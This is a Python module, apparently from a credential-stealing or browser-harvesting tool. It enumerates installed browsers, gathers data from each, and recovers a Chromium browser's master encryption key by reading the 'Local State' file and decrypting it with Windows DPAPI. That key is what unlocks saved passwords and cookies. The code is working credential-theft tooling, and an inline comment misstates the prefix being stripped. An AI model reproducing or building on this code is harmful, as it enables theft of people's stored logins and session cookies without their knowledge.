from modules.browser.browser_shared import Browsers, get_installed_browsers
import os
import json
import base64
import win32crypt

class BrowserWindows:
  def __init__(self) -> None:
    self.browsers = Browsers()

  def run(self) -> dict:
    installed_browsers = get_installed_browsers()

    browser_data = {}
    for browser in installed_browsers:
        browser_data[browser] = self.browsers.get_browser_data(browser)

    return browser_data

  def __get_master_key(self, path: str):
        """Retrieve the browser master key."""
        if not os.path.exists(path):
            return None

        local_state_path = os.path.join(path, "Local State")
        if 'os_crypt' not in open(local_state_path, 'r', encoding='utf-8').read():
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # Remove the 'v10' prefix
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
